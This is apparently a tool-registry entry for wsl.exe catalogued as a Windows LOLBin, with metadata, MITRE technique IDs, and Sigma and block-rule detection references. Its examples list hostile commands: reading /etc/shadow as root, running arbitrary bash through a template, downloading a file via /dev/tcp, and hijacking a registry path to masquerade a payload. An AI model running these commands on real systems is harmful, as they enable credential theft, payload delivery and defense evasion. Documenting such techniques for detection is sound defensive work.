---
id: windows-execution-wsl
namespace: windows:execution:wsl
name: wsl
description: 'Windows subsystem for Linux executable Located at: C:\Windows\System32\wsl.exe.'
author: Matthew Brown
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- wsl
parameters: []
features: []
execution:
  template: wsl
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Executes calc.exe from wsl.exe (Performs execution of specified file, can be used to execute arbitrary Linux commands.)
  command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
- description: Cats /etc/shadow file as root (Performs execution of arbitrary Linux commands as root without need for password.)
  command: wsl.exe -u root -e cat /etc/shadow
- description: Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`) (Performs execution of arbitrary Linux commands.)
  command: wsl.exe --exec bash -c "{CMD}"
- description: Downloads file from 192.168.1.10 (Download file)
  command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
- description: When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder. (Execute a payload as a child process of `bash.exe` while masquerading as WSL.)
  command: wsl.exe
references:
- label: microsoft-recommended-block-rules
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- label: '1535431474429808642'
  url: https://twitter.com/nas_bench/status/1535431474429808642
- label: ''
  url: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1202
- T1105
- T1218
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- type: ioc
  description: Child process from wsl.exe
install:
- method: choco
  package_name: wsl
  commands:
  - choco install wsl
---


# wsl

wsl is a Windows LOLBin. Windows subsystem for Linux executable Located at: C:\Windows\System32\wsl.exe.
